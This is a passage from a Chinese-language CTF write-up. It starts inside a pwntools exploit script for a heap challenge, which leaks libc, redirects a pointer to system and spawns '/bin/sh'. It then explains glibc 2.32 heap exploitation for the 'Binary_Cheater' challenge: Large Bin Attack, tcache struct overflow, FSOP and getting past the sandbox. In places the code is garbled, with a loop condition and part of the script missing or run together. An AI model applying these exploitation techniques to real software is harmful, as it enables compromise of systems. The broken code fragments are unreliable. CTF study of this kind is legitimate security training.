                if len(libc_info) == 2:
                    if "libc" in libc_info[0]:
                        libc_path = libc_info[1].split(' (')
                        if len(libc_path) == 2:
                            libc = ELF(libc_path[0].replace(' ', ''), checksec=False)
                            return libc
        except:
            pass
        if context.arch == 'amd64':
            libc = ELF("/lib/x86_64-linux-gnu/libc.so.6", checksec=False)
        elif context.arch == 'i386':
            try:
                libc = ELF("/lib/i386-linux-gnu/libc.so.6", checksec=False)
            except:
                libc = ELF("/lib32/libc.so.6", checksec=False)
        return libc
    def get_sh(Use_other_libc=False, Use_ssh=False):
        global libc
        if args['REMOTE']:
            if Use_other_libc:
                libc = ELF("./libc.so.6", checksec=False)
            if Use_ssh:
                s = ssh(sys.argv[3], sys.argv[1], sys.argv[2], sys.argv[4])
                return s.process(file_name)
            else:
                return remote(sys.argv[1], sys.argv[2])
        else:
            return process(file_name)
    def get_address(sh, libc=False, info=None, start_string=None, address_len=None, end_string=None, offset=None,
                    int_mode=False):
        if start_string != None:
            sh.recvuntil(start_string)
        if libc == True:
            return_address = u64(sh.recvuntil('\x7f')[-6:].ljust(8, '\x00'))
        elif int_mode:
            return_address = int(sh.recvuntil(end_string, drop=True), 16)
        elif address_len != None:
            return_address = u64(sh.recv()[:address_len].ljust(8, '\x00'))
        elif context.arch == 'amd64':
            return_address = u64(sh.recvuntil(end_string, drop=True).ljust(8, '\x00'))
        else:
            return_address = u32(sh.recvuntil(end_string, drop=True).ljust(4, '\x00'))
        if offset != None:
            return_address = return_address + offset
        if info != None:
            log.success(info + str(hex(return_address)))
        return return_address
    def get_flag(sh):
        sh.recvrepeat(0.1)
        sh.sendline('cat flag')
        return sh.recvrepeat(0.3)
    def get_gdb(sh, gdbscript=None, addr=0, stop=False):
        if args['REMOTE']:
            return
        if gdbscript is not None:
            gdb.attach(sh, gdbscript=gdbscript)
        elif addr is not None:
            text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(sh.pid)).readlines()[1], 16)
            log.success("breakpoint_addr --> " + hex(text_base + addr))
            gdb.attach(sh, 'b *{}'.format(hex(text_base + addr)))
        else:
            gdb.attach(sh)
        if stop:
            raw_input()
    def Attack(target=None, sh=None, elf=None, libc=None):
        if sh is None:
            from Class.Target import Target
            assert target is not None
            assert isinstance(target, Target)
            sh = target.sh
            elf = target.elf
            libc = target.libc
        assert isinstance(elf, ELF)
        assert isinstance(libc, ELF)
        try_count = 0
        while try_count >", "edit({0});".format(idx))
        sh.sendafter("00101110011101101010011000101110011101101111011011000110", content)
    def show(idx):
        sh.sendlineafter(">>", "show({0});".format(idx))
    def free(idx):
        sh.sendlineafter(">>", "free({0});".format(idx))
    def gain(idx, size, content):
        sh.sendlineafter(">>", "gain({0});".format(idx))
        sh.sendlineafter("10100110010111101001011011001110:", str(size))
        sh.sendafter("00101110011101101010011000101110011101101111011011000110", content)
    def pwn(sh, elf, libc):
        context.log_level = "debug"
        ToString("01110110100101101000011011100110")
        ToString("00101110100101100010011010100110")
        ToString("11101110111101100001011011001110")
        ToString("10100110101001100100111001100110")
        ToString("00101110100101100001111010100110")
        ToString("01110110111101101001011000101110110001101010111001001110001011101100111001110110100101100000010000100")
        ToString("110100101100011011010000110011011100111011010010010")
        ToString("00101110011101101010011000101110011101101111011011000110")
        gain(0, 0xF00 - 0x100, 'a' * (0xf00 - 0x100))  # 0
        gain(1, 0xB0, 'a' * 0xB0)  # 1
        free(0)
        free(1)
        #gdb.attach(sh)
        gain(4, 0x1e8, p64(0x4043a0) + 'c' * 0x1df + "\n")  # 4
        gain(5, 0xB0, 'a' * 0xb0)
        gain(6, 0x131410c0,  p64(0x131410e0) + p64(0) + p64(0) + p64(0) + p64(0x4040b8) + "\n")
        show(2)
        libc_base = get_address(sh, True, offset=-0x47730, info="libc_base:\t")
        system_addr = libc_base + 0x55410
        edit(2, p64(system_addr) + p64(0x401186))
        sh.sendlineafter(">>", "gain(/bin/sh);")
        sh.interactive()
    if __name__ == "__main__":
        sh = get_sh()
        flag = Attack(sh=sh, elf=get_file(), libc=get_libc())
        sh.close()
        log.success('The flag is ' + re.search(r'flag{.+}', flag).group())
## Binary_Cheater
这道题赛后了解到是 FMYY 出的题目，记得上次做 FMYY 出的 NULL_FXCK
的那题，调了一天，现在都还有些阴影。这次这道题目只调了一下午，也算是有进步了吧~
这道题加了一个 ollvm 控制流平坦化，导致程序代码非常的难看。但是这其实不影响我们看程序的大概逻辑，通过题目给出的 hint
也能大概能知道题目的漏洞点。所以对于这道题我们来重点分析程序的利用方法，而不是如何 **反 ollvm 控制流平坦化**
，这部分内容如果有需要了解的可以看“看雪无名侠大佬的文章”来学习如何使用 Unicorn 来反混淆，关于 Unicorn 的使用方法也可以先学习[使用
unicorn 来自动化解题](https://www.anquanke.com/post/id/246451)这篇文章。
###  程序漏洞和限制条件
1.限制了申请 size 只能在 0x410 和 0x450 之间
2.使用 calloc 函数进行申请
3.没有 exit 功能
4.存在 UAF 漏洞，但是通过一个字段标记使得无法进行 double free。
5.开启沙箱
6.禁用 free_hook 和 malloc_hook
###  漏洞利用
以下使用做题者的角度来思考解题的过程，使得阅读过程非常流程自然。
####  如何控制程序流程
首先是 calloc 函数和申请 size 只能 UAF 使我想到了 cnitlrt 师傅的[新版本 glibc 下的 IO_FILE
攻击](https://www.anquanke.com/post/id/216290)这篇文章，主要的思想就是通过
_IO_str_overflow 这个函数中的 malloc、memcpy、free 这三个函数组合来达到控制程序流程的目的（任意位置写）。
我们假设 tcache 的某个 size 对应的链表头部被修改成__free_hook，这时候我们触发 FSOP 来执行这一段代码。
1.通过 malloc 申请得到__free_hook
2.通过 memcpy 复制之前伪造好的数据覆盖到__free_hook 上，（例如复制一个 system 指针）
3.通过 free 来释放堆块，同时触发__free_hook 的函数指针。
如果程序没有开启沙箱，这里直接覆盖__free_hook 为 system，然后再调整一下写入起始位置，使得头部数据为’/bin/sh’，即可执行
system(‘/bin/sh’);
如果程序开启了沙箱，那么就可以通过修改__free_hook 为某个 gadget 来通过 setcontext 执行 SROP 来用 ROP
orw。这里需要 gadget 利用是因为 setcontext + 61 从 glibc 2.29 之后变为 rdx 寄存器传参，所以需要控制 rdx
寄存器的内容。这部分的操作如果不熟悉可以看[【PWNHUB 双蛋内部赛】StupidNote
Writeup](http://blog.wjhwjhn.com/archives/155/) 这篇文章。
所以在控制流程之前我们至少需要满足以下两个条件
1.让 tcache 某个 size 对应的链表头部被修改为__free_hook
2.触发 FSOP
####  如何伪造 tcache 链表头部
这里可以用的方法很多，我这里简单的说说平常可能会用到的方法，然后再根据这道题目限制的条件进行筛选。
1.利用 Tcache Stashing Unlink Attack
利用 Tcache Stashing Unlink 过程中 small bin 放入 tcache 的过程中，伪造 small bin 的内容，并且使用
Large Bin Attack 在伪造指针的 bk 位置写一个可写地址让程序奔溃，结合以上操作可以使得 Tcache 的链表头部变成任意地址。
这部分的内容实际上就是 [house of pig](https://www.anquanke.com/post/id/242640)
这道题目利用的手法，有兴趣的可以前往学习，但是个人认为这个方法不能称作 house of xxx 的手法，并且 cnitlrt 师傅在去年 5
月份就发现了这个利用思路，实在不能称作新的堆利用方法。
这个方法对于这道题来说难以实现，主要是因为这道题限制了申请的 size 为 LargeBin 大小，难以构造出多个 small bin 堆块。
2.利用 Large Bin Attack 攻击 TLS 结构体中的 Tcache 结构体指针
通过 Large Bin Attack 劫持 Tcache 结构体指针，使得 Tcache
结构体内容变为可控内容，从而修改链表头部数据。这里很有可能会出现的问题和 [house of
banana](https://www.anquanke.com/post/id/222948) 这个利用方法一样，由于 ld
版本不同，并且通常情况下题目未给出，导致出现需要爆破偏移的情况。这里我问了 FMYY 师傅，给出的解决方法是在本地起一个 Docker
来计算偏移，利用靶机通常都是使用官方镜像这个点来计算得到稳定的偏移值。
3.利用 Large Bin Attack 攻击 mp_.tcache_bins 来造成 Tcache Struct 溢出利用
这个方法可以通过 [glibc 2.27-2.32 版本下 Tcache Struct
的溢出利用](https://www.anquanke.com/post/id/235821) 这篇文章来学习。这个利用方法也是 cnitlrt
师傅先发现的。大概就是让 Tcache Struct 的内容溢出到可控的空间，相当于控制了链表头部。
这里的方法都是基于 Large Bin Attack 来实现的，这个方法可以通过 [Large Bin Attack
学习记录](http://blog.wjhwjhn.com/archives/147/) 这篇文章来学习，由于这道题是 glibc2.32 的，在
glibc2.30 中修复了一个利用位置，所以只需要看 **glibc2.30 的检测** 这一部分即可。
#####  如何触发__malloc_assert
这部分主要是来源于源码中任何调用 **assert** 的部分（注意这里不是调用 **malloc_printerr** 的部分）
在 malloc 中有很多可用的点，这个也相对来说比较简单，因为我们平时都想办法绕过这个检测，这时候特意的去触发检测相对来说要简单许多。
**1.sysmalloc 部分**
在这部分中会触发的检测可以参照 **house of force** 会遇到的问题，主要就是如果申请后的 top chunk size 小于
MINSIZE（0x10）或者不足够当次申请时，那么就会触发重新申请来调用 sysmalloc，在 sysmalloc 中会检查是否对齐，如果未对齐就会触发
assert 来报错退出。
**2._int_malloc 部分**
这一部分利用来自于修改 largebin 上 size 对应的 large bin 的链表头部的 bk 指针，使其指向位置的 size 结构满足以下条件
    #define chunk_main_arena(p) (((p)->mchunk_size & NON_MAIN_ARENA) == 0)
就可以触发 assert 进入 FSOP 流程
**3.其他位置**
以上介绍的两个位置均是在 House of Kiwi 中所提及的位置，相对来说利用比较简单。在其他地方也存在着许多可利用的位置，可以自行寻找。
####  修改 stderr 指针
这个指针存在于 libc 上，我们只需要通过 Large Bin Attack 来修改就可以劫持到我们的可控堆块上
在代码中使用的 stderr 都是从这里得到的。
####  细节问题
很多师傅在复现过程中可能会遇到的一些问题，我在这里进行提及。
1.在 EXP 脚本中使用的攻击手法是使用攻击 mp_.tcache_bins 来造成 Tcache Struct 溢出利用，其对应的溢出位置是采用
**调试 + 计算** 的方法结合来找到的，这里给出一个我在过程中用于计算的一个程序。
    #define csize2tidx(x) (((x) - 0x20 + 0x10 - 1) / 0x10)
    #include 
    int main()
    {
        for (size_t tbytes = 0; tbytes counts[tc_idx] 位置中的 tc_idx 来计算出对应调用所需要的
tbytes(size)，利用这个 tbytes 再推出在 IO 上需要构造的地址。我使用了一个爆破的方法非常丑陋，实际上也可以直接逆推。
在这个 glibc 版本中
**tcache- >counts[tc_idx] 的偏移计算是 tcacheStruct + 2 * tc_idx**
**tcache- >entries[tc_idx] 的计算偏移是 tcacheStruct + 2 * 64 + 8 * tc_idx 
tcacheStruct + 0x80 + 8 * tc_idx  tcacheStruct + 8 * (0x10 + tc_idx)。**
图中 rbx 对应的是 tc_idx，rax 对应的是 tcacheStruct
tcacheStruct 是储存 tcache_perthread_struct 结构体的起始位置的指针（\x10 结尾）
由于在之前的版本中 tcache_perthread_struct 结构体内容有所变化，所以我建议还是以调试结果为主。
2.IO 数据的构造
这部分 IO 的构造可以参考 [SWPUCTF2020 corporate_slave _IO_FILE
组合利用](http://blog.wjhwjhn.com/archives/138/) 这篇文章中我所分析的。由于这篇文章写的较早，当时学习的 glibc
版本较低，有些东西可能不再适用于最新版本，希望各位师傅可以尝试着去看源码来分析。
需要注意的是，与 house of pig 那题中的 IO 结构不同的是，这道题中的 IO 结构中的 _lock (+0x88)
要为一个可访问的指针，如果不是的话，在这道题中调用 _IO_flockfile(fp) 时会对_lock 所指向的地址进行访问，导致程序在一个 cmp
指令处报错，这一点在[ AngleBoy (NTU CSIE Cpmputer Security 2018 Fall) Play with FILE
Structure – I](https://www.youtube.com/watch?v=_ZnnGZygnzE) （23:14）中也提到过。
3.禁用 **free_hook 和** malloc_hook
这道题实际上会检查这两个 hook 函数的数据来防止非预期的，但实际上我们利用 **_IO_str_overflow**
这个函数来控制程序流程使得程序根本没有机会来检测__free_hook，所以就相当于我们绕过了这个检测。
4.修改 top chunk 的 size
这个主要是利用 unsortedbin 堆块与 top chunk 合并后的 UAF 来达成的，就是提前申请一块空间再释放掉使其与 top chunk